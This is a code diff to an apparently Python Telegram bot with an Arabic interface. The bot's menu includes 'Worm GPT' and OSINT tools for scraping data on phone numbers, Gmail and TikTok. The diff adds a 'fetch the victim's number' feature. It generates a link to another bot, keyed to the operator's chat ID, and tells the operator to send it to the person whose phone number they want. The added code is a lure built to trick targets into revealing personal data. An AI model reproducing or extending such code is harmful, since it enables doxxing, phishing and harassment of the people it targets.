@@ -445,6 +445,7 @@ def build_main_menu():
         ("Worm GPT 🐛", "worm_gpt"),
         ("المزيد من بوتاتي 🤖", "more_bots"),
         ("📱 بوتات سحب بيانات الرقم", "osint_phone_bots"),
+        ("جلب رقم الضحية2 📞", "victim_number2"),
         ("📧 سحب بيانات عبر Gmail", "osint_gmail"),
         ("📞 موقع جلب معلومات الرقم", "osint_caller"),
         ("🎵 جمع معلومات تيك توك", "osint_tiktok"),
@@ -1715,6 +1716,16 @@ def callback_query(call):
             bot.edit_message_text("🔍 **قسم OSINT**\n\nاختر من القائمة:", chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
         except:
             bot.send_message(chat_id, "🔍 **قسم OSINT**\n\nاختر من القائمة:", reply_markup=markup, parse_mode="Markdown")
+
+    elif call.data == "victim_number2":
+        link = f"https://t.me/ygf2gbot?start={chat_id}"
+        markup = InlineKeyboardMarkup(row_width=1)
+        markup.add(InlineKeyboardButton("🔗 اضغط لنسخ الرابط", url=link, style="primary"))
+        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main", style="primary"))
+        try:
+            bot.edit_message_text(f"📞 **جلب رقم الضحية2**\n\nارسل هذا الرابط للشخص المراد معرفة رقم هاتفه:\n\n{link}", chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
+        except:
+            bot.send_message(chat_id, f"📞 **جلب رقم الضحية2**\n\nارسل هذا الرابط للشخص المراد معرفة رقم هاتفه:\n\n{link}", reply_markup=markup, parse_mode="Markdown")
 
     elif call.data == "more_bots":
         markup = InlineKeyboardMarkup(row_width=1)
